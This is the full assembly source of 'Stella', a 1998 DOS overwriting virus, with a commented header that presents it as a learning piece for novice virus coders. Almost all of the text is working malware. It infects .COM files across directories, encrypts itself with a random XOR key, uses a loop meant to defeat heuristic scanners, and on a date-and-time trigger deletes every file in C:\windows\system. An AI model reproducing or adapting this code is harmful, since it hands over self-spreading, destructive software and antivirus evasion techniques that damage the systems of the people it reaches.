



;Stella v1.0
;coded by Opic [Codebreakers],1998
;type:overwriting
;encryption:yes, XOR
;anti-AV: yes, anti-heuristics
;directory transversal:yes, dotdot rutine
;restore file date/time stamps:yes
;also does NOT infect command.com
;rate of infection:4 files per run
;stealth:no
;polymorphic:no
;compiled with a86 
;size: zero gen=440 bytes
;detectability:not detected (at the time of release) by F-prot,AVP,or
;Findvirus, although the
;fact that it is a simple overwriting virus pretty much gives it away hehe.. 
;payload: yes, on the 4th day of the month a message will be printed to
;the screen, if it is the 4th second on the 4th day of the month
;c:\windows\system directory will be deleted rendering windows unusable
;(although quite fixable and would not damage any personal data)the virus
;also takes the time to change to the windows\system directory. Stella 
;also uses a
;new technique of searching .com files (or at least new to me). this is
;basically a novelty virus for which i could hone my skills with, due to its
;numeral relationships, amusing characteristics,payloads ect. Hopfully
;this virus will help those of you new to virus coding, enjoy! 


start:                            ;start of virus
      mov cx,0ffffh               ;loop to kill heuristic scanners
no_av1:
      jmp no_av2
      mov ax,4c00h
      int 21h
no_av2:
      loop no_av1

;clears infection counter
      mov byte ptr [counter],0    ;clears infection counter      
      nop                         ;we want it 440 bytes, 440mhz =A note
                                  ;in case you ever need to know that
      lea si,crypt_start          ;load crypt_start to si
      mov di,si                   ;mov si to di
      mov cx,ende - crypt_start   ;put whole part to encrypt in cx
      call crypt                  ;call crypt rutine
      jmp crypt_start             ;jump to crypt start

crypt:         
      lodsb                       ;
      nop                         ;these help mask the en/decrypt
      xor al,byte ptr [xor_value] ;
      nop                         ;rutine i find.
      stosb                       ;
      nop                         ;
      loop crypt                  ;
      nop                         ;
      ret                         ;


      xor_value db 0              ;decrypt to a value of 0

crypt_start:                      ;start of part to encrypt


      mov ah,4eh                  ;find first file
findnext:                         ;label well need later
      
      nop 
      lea dx,filespec             ;tells virus what kindo file we want to find
      xor cx,cx                   ;clear cx
      int 21h                     ;do it!
      jnc verify                    ;jump if carry flag isnt set, if it is set
                                  ;then there are no more files so we exit

;dirT:                             ;dotdot rutine
      lea dx,dotdot               ;get dotdot from data offset
      mov ah,3bh                  ;int to change dirs
      int 21h                     ;here we go....
      jnc crypt_start             ;yes.....
     
;windoze:
      mov ah,3bh                  ;cd to...
      lea dx,winspec              ;windoze!
      int 21h
      jnc crypt_start             ;and find first
      jmp check_payload           ;done with doze? lets bring it on home!

verify:
      mov cx, 13d                 ;max size of file name....sorta
      lea si, 9eh                 ;well i know i stole this from someone ;)
compare:
      lodsb                       ;letter in al
      cmp al, "."                 ;did i make my point?
      jne compare                 ;no? test next letter
      inc si                      ;yes? si tells us 2nd letter
      cmp word ptr [si], "MO"     ;2nd and 3rd letters give us? c-o-m!
      jne next                    ;no? next file in dir then........ 
      cmp word ptr [9eh + 2], "MM"  ;it isnt command.com is it?
      je next                     ;it is? next please! 
          
open:                             ;infection rutine
      mov ax,3d02h                ;open file for read/write acess
      nop
      mov dx,9eh                  ;get file info from DTA
      int 21h                     ;do it 
      nop
      xchg bx,ax                  ;we need the file handle from ax in bx so.......
      mov ax,5700h                ;get time/date stamp
      int 21h                     ;now!
      push cx                     ;
      push dx                     ;
      in al,40h                   ;random value fer en/decrypt
      mov byte ptr [xor_value],al ;save for xor_value
      lea si,crypt_start          ;load crypt start
      lea di,ende                 ;and ende
      mov cx,ende - crypt_start   ;respectivly
      call crypt                  ;call crypt rutine
      mov ah,40h                  ;INFECT!-> write to file
      mov cx,crypt_start - start  ;infect crypt start thru start
      lea dx,start                ;and start writing here :)
      int 21h                     ;go for it!
      mov ah,40h                  ;infect 2nd part
      mov cx,ende - crypt_start   ;write rest of virus 2 file
      lea dx,ende                 ;duh
      int 21h                     ;go!
      mov ax,5701h                ;restore time/date stamp
      pop dx                      ;
      pop cx                      ;
      int 21h                     ;now!
      mov ah,3eh                  ;close her up
      int 21h                     ;now
;infection counter
      inc byte ptr [counter]      ;add one to counter
      cmp byte ptr [counter],4    ;4 infections?
      je check_payload            ;we hit ? check pay


next:
      mov ah,4fh                  ;find next file
      jmp findnext                ;jump to findnext

check_payload:
      mov ah,2ah                  ;get system date
      int 21h
      cmp dl,4                    ;is it the 4th of the month?
      jne no_more_files           ;no? lets split
       mov ah,9h                   ;Function 09h:print to screen
      lea dx,message              ;print our message
      int 21h                     ;please!
      mov ah,2Ch                  ;check the time
      int 21h
      cmp dh,4                    ;is it the 4th second of the minute?
      nop
      jne no_more_files           ;no? lets blow this popcorn stand
;the BIG but unlikely payload!
      mov ah,3bh                  ;cd to...
      lea dx,winsys               ;c:\windows\system
      int 21h
      mov ah,41h                  ;delete
      lea dx,delete               ;delete all files in subdir
      int 21h                     ;dont worry its fixable!


no_more_files:                    ;duh

      ret                         ;exit
 
   

filespec  db '*.c*',0                 ;what do kind of file we are lookin for
winspec   db 'C:\windows\command',0   ;windoze command dir
winsys    db 'C:\windows\system',0    ;windows\system dir
dotdot    db '..',0                   ;change dir all the way to .. (root)          
counter   db 0                        ;our counter
delete    db '*.*',0                  ;fuck 'em! it must be bad karma
message  db 'Which is stronger Man or Chu ',10,13,
         db 'locked in endless warfare ',10,13,       
         db 'fighting over empty names ',10,13,    
         db 'using up peoples strength',10,13,
         db '',10,13,
         db 'Stella, coded by Opic [codebreakers],1998',10,13,'$'

ende:                             ;thats all she wrote.

